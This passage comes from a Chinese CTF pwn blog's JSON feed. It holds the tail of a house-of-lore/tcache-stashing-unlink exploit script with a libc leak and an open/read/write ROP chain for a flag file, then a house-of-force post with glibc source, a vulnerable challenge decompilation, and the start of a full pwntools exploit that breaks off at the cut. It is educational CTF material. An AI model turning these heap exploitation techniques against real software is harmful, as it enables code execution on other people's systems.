number\">0xb000</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tAdd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\tDel<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 防止合併</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span>\t\t\t <span class=\"token comment\"># 置入 unsortedbin</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 切割 </span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xe7e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x250</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>lvr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000058373</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026542</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>rsi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026f9e</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>rdx <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000012bda6</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>writ_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xf630</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>pay <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">b'./flag\\x00\\x00'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> writ_addr</pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>pay2 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lvr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>meau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'What do you want to say?'</span><span class=\"token punctuation\">,</span>pay2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNC1ob3VzZS1vZi1sb3Jl\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#24-house-of-lore</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXBoZXJzYXcubWUvY3RmLXdpa2kvcHduL2xpbnV4L2hlYXAvaG91c2Vfb2ZfbG9yZS8=\">https://ciphersaw.me/ctf-wiki/pwn/linux/heap/house_of_lore/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHVvbGVxaS9wLzEyODQwMTU0Lmh0bWwjaG91c2Utb2YtbG9yZQ==\">https://www.cnblogs.com/luoleqi/p/12840154.html#house-of-lore</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rYWJlb3IuY24vSG91c2UlMjBvZiUyMCVFNyVCMyVCQiVFNSU4OCU5NyVFNSVBMCU4NiVFNiVCQyU4RiVFNiVCNCU5RSVFOCVBRiVBNiVFOCVBNyVBMyglRTQlQjglODApLyNIb3VzZS1vZi1sb3Jl\">https://kabeor.cn/House of 系列堆漏洞详解 (一)/#House-of-lore</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM2Mi8jdG9jXzB4MDA=\">https://tttang.com/archive/1362/#toc_0x00</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Ric3FpZ29uZ3ppL2FydGljbGUvZGV0YWlscy8xMjYyOTM5MzI=\">https://blog.csdn.net/tbsqigongzi/article/details/126293932</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uaWNob2xhcy13ZWkuZ2l0aHViLmlvLzIwMjIvMDIvMDcvdGNhY2hlLXN0YXNoaW5nLXVubGluay1hdHRhY2sv\">https://nicholas-wei.github.io/2022/02/07/tcache-stashing-unlink-attack/</span></p>\n<p><a href=\"https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/\">https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/</a></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-lore",
                "tcache-stashing-unlink-attack"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/19/house-of-force/",
            "url": "https://yhuanhuan01.github.io/2024/07/19/house-of-force/",
            "title": "house-of-force",
            "date_published": "2024-07-19T01:01:10.000Z",
            "content_html": "<h1 id=\"house-of-force\"><a class=\"markdownIt-Anchor\" href=\"#house-of-force\">#</a> house-of-force</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> ——  <code>2.27</code></li>\n<li>可分配任意大小的  <code>chunk</code></li>\n<li>需要泄露或已知地址</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>堆溢出写 topchunk 的 size，使得 size 值很大。可以申请到一些可利用地址</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>victim <span class=\"token operator\">=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取当前 top chunk 的地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      size <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 计算 top chunk 的大小</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>nb <span class=\"token operator\">+</span> MINSIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token comment\">//MINSIZE 就是堆块的最小 size，32 位程序为 0x10，64 位程序为 0x20</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token comment\">// 如果 top chunk 的大小大于 nb (程序执行 malloc 需要分配的内存大小)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token comment\">// 加上 MINSIZE 的大小，就从 top chunk 中来切一块内存</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token comment\">// 之所以要加上 MINSIZE 是要保证切割后剩余的内存要是一个完整的堆块</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>          remainder_size <span class=\"token operator\">=</span> size <span class=\"token operator\">-</span> nb<span class=\"token punctuation\">;</span><span class=\"token comment\">//remainder_size 为切割后的剩余大小</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>          remainder <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//remainder 为切割前 top chunk+nb 的值，也就是切割后 top chunk 的地址</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>          av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> remainder<span class=\"token punctuation\">;</span><span class=\"token comment\">// 更新 top chunk</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>          <span class=\"token comment\">// 下面两个 set_head 给切割出去的堆块以及切割后的 top chunk 设置新的 size</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>          <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb <span class=\"token operator\">|</span> PREV_INUSE <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                    <span class=\"token punctuation\">(</span>av <span class=\"token operator\">!=</span> <span class=\"token operator\">&amp;</span>main_arena <span class=\"token operator\">?</span> NON_MAIN_ARENA <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>          <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>remainder<span class=\"token punctuation\">,</span> remainder_size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token function\">check_malloced_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 调试用的，这里没用</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 返回用户指针</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>          <span class=\"token function\">alloc_perturb</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<ul>\n<li>申请  <code>chunk A</code></li>\n<li>写  <code>A</code>  的时候溢出，修改  <code>top_chunk</code>  的  <code>size</code>  为很大的数</li>\n<li>分配很大的  <code>chunk</code>  到任意已知地址</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG91c2Utb2YtZm9yY2U=\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/house-of-force</span></p>\n<p><img data-src=\"/img/house-of-force/image-20240719085105073.png\" alt=\"image-20240719085105073\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-120h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-118h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-110h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+118h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>count<span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>i <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>count <span class=\"token operator\">></span> <span class=\"token number\">39</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> nptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0xFuLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  size <span class=\"token operator\">=</span> <span class=\"token function\">atol</span><span class=\"token punctuation\">(</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token operator\">*</span>i <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//size 大小没判断</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bin addr %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x50uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 可以堆溢出</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"done\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>根据上面代码，size 大小可以申请很大（2.23-2.27），并且大小小于 0x50 的 chunk 可以进行堆溢出。可以想到利用 HOF</p>\n<p>首先第一步，泄露 libc，利用可以申请很大的特点，我们可以申请超大内存，获取 libc 地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>addr <span class=\"token operator\">=</span> Add<span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaaaaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#用 mapp 分配，泄露 libc</span></pre></td></tr></table></figure><p>接下来劫持 malloc_hook，但是劫持 malloc_hook 不太行，用 realloc 调整栈帧即可</p>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token 